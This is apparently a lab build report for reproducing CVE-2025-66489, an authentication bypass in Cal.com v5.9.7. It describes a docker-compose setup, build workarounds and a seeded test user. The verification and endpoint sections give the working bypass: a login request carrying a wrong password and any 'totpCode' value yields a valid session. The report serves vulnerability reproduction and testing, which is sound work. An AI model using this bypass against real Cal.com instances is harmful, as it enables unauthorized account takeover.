# Lab Build Report: CVE-2025-66489

## Lab Architecture

**Architecture Type:** Multi-container (docker-compose)

The lab consists of two containers:

| Container | Image | Role | Port |
|-----------|-------|------|------|
| `cve-2025-66489-db` | `postgres:15-bookworm` | PostgreSQL database | 5432 (internal) |
| `cve-2025-66489-vulnerable` | `cve-2025-66489-vulnerable:latest` | Cal.com v5.9.7 (vulnerable) | 3000 (internal) |

**Networking:**
- Both containers are on the `lab_lab-net` bridge network for internal communication
- The vulnerable container is on the `lab-net` bridge network
- The DB container is accessible from the vulnerable container via hostname `cve-2025-66489-db`

## Container Details

### Database Container (`cve-2025-66489-db`)
- **Image:** `postgres:15-bookworm`
- **Credentials:** `unicorn_user` / `magical_password`
- **Database:** `calendso`
- **Healthcheck:** `pg_isready -U unicorn_user -d calendso`
- **Volume:** `db-data` mounted at `/var/lib/postgresql/data`

### Vulnerable Container (`cve-2025-66489-vulnerable`)
- **Base Image:** `node:20` (3-stage build from Cal.com source)
- **Version:** Cal.com v5.9.7 (commit `8167fe0d05`)
- **Framework:** Next.js 15.5.4
- **Port:** 3000 (HTTP)
- **Healthcheck:** `wget --spider http://localhost:3000`
- **Startup Process:**
  1. Replaces placeholder URLs
  2. Waits for database
  3. Runs `npx prisma migrate deploy` (creates all tables)
  4. Seeds app store via `npx ts-node scripts/seed-app-store.ts`
  5. Starts Next.js via `yarn start`

### Environment Variables
```
DATABASE_URL=postgresql://unicorn_user:magical_password@cve-2025-66489-db:5432/calendso
DATABASE_DIRECT_URL=postgresql://unicorn_user:magical_password@cve-2025-66489-db:5432/calendso
DATABASE_HOST=cve-2025-66489-db:5432
NEXTAUTH_SECRET=secret
CALENDSO_ENCRYPTION_KEY=secret
NEXT_PUBLIC_WEBAPP_URL=http://localhost:3000
NEXTAUTH_URL=http://localhost:3000
CALCOM_TELEMETRY_DISABLED=1
NEXT_PUBLIC_LICENSE_CONSENT=agree
```

## Build Status

| Component | Status | Notes |
|-----------|--------|-------|
| PostgreSQL | ✅ SUCCESS | Standard image, healthy |
| Cal.com v5.9.7 | ✅ SUCCESS | Built from source using modified Dockerfile (removed BuildKit `--platform` directive) |
| Prisma migrations | ✅ SUCCESS | All tables created automatically on startup |
| Test user seeding | ✅ SUCCESS | `victim@example.com` with bcrypt password hash |

### Build Workarounds
1. **BuildKit not available:** The original Dockerfile uses `FROM --platform=$BUILDPLATFORM` which requires BuildKit/buildx. Created `Dockerfile.vulnerable` in the lab directory that removes this directive.
2. **Prisma UUID:** The `users` table `uuid` column has no database-level default (Prisma generates UUIDs at app level). The seed SQL uses `gen_random_uuid()` explicitly.
3. **App store seed error:** The `seed-app-store.ts` script throws `ReferenceError: seedAppData is not defined` but this is non-fatal — all apps are seeded before the error, and the web server starts normally.

## Test User

| Field | Value |
|-------|-------|
| **Email** | `victim@example.com` |
| **Password** | `Password123!` |
| **Password Hash** | `$2b$10$zQfXC6SxIG8iuxiWGeYJB.cQRuObMrXS2k9KGTB9/Rp1TxpxN0HqG` |
| **Identity Provider** | `CAL` |
| **2FA Enabled** | `false` |
| **Completed Onboarding** | `true` |
| **Role** | `USER` |

## Start/Stop Commands

```bash
# Start the lab
docker compose up -d

# Seed test user (run after vulnerable container is healthy)
bash seed-test-user.sh

# Check status
docker compose ps

# View logs
docker compose logs -f vulnerable

# Stop the lab
docker compose down

# Full reset (including database data)
docker compose down -v
```

**Note on image build:** The image `cve-2025-66489-vulnerable:latest` has already been built and tagged. Subsequent `docker compose up -d` will reuse the pre-built image. To rebuild from scratch:
```bash
docker build --no-cache -t cve-2025-66489-vulnerable:latest \
  --build-arg NEXT_PUBLIC_WEBAPP_URL=http://localhost:3000 \
  --build-arg NEXTAUTH_SECRET=secret \
  --build-arg CALENDSO_ENCRYPTION_KEY=secret \
  --build-arg "DATABASE_URL=postgresql://unicorn_user:magical_password@cve-2025-66489-db:5432/calendso" \
  -f Dockerfile.vulnerable .
```

## Accessing the Vulnerable Container

From the host:
```bash
# Get container IP
CONTAINER_IP=$(docker inspect cve-2025-66489-vulnerable | jq -r '.[0].NetworkSettings.Networks["lab-net"].IPAddress')

# Access the app
curl "http://${CONTAINER_IP}:3000/api/auth/csrf"
```

From inside the container:
```bash
docker exec cve-2025-66489-vulnerable curl http://localhost:3000/api/auth/csrf
```

## Verification Evidence

### Vulnerability Confirmed (Authentication Bypass)

**Negative test (normal login with wrong password → FAILS correctly):**
```
POST /api/auth/callback/credentials
email=victim@example.com&password=WRONG_PASSWORD&csrfToken=<token>

Result: HTTP 302 → /api/auth/error?error=incorrect-email-password
```

**Positive test (bypass with totpCode → SUCCEEDS, demonstrating vulnerability):**
```
POST /api/auth/callback/credentials
email=victim@example.com&password=WRONG_PASSWORD&totpCode=000000&csrfToken=<token>

Result: HTTP 302 → /
Set-Cookie: next-auth.session-token=eyJhbGciOiJkaXIiLCJlbmMiOiJBMjU2R0NNIn0...
```

**Session verification (bypass grants full access):**
```
GET /api/auth/session (with session cookie)
Response: {"user":{"name":"Victim User","email":"victim@example.com","id":2,"role":"USER",...}}
```

## Vulnerable Endpoint

| Field | Value |
|-------|-------|
| **Endpoint** | `POST /api/auth/callback/credentials` |
| **Content-Type** | `application/x-www-form-urlencoded` |
| **CSRF Token** | Obtained from `GET /api/auth/csrf` |
| **Bypass Field** | `totpCode` (any truthy value, e.g., `000000`, `x`, `anything`) |

## Known Issues

1. **Container lifecycle:** The vulnerable container may occasionally be removed by Docker if the lab-net network changes. Use `docker compose up -d` to recreate. The pre-built image is reused so restart is fast (~30s).
2. **App store seed warning:** `ReferenceError: seedAppData is not defined` appears during startup. This is a non-fatal error in the seed script and does not affect the vulnerable endpoint.
3. **Memory usage:** Cal.com is a large Node.js application. The vulnerable container uses ~500MB-1GB RAM during startup and stabilizes at ~300-500MB.
4. **Build time:** The initial Docker build takes 5-10 minutes due to the large monorepo (Next.js, Turbo, Prisma, hundreds of packages). The pre-built image avoids this on subsequent starts.

## Files in Lab Directory

```
CVE-2025-66489/
├── docker-compose.yml          # Container orchestration
├── Dockerfile.vulnerable       # Cal.com v5.9.7 build (modified from source)
├── seed-user.sql               # SQL to seed test user (reference)
└── seed-test-user.sh           # Shell script to seed test user via docker exec
```
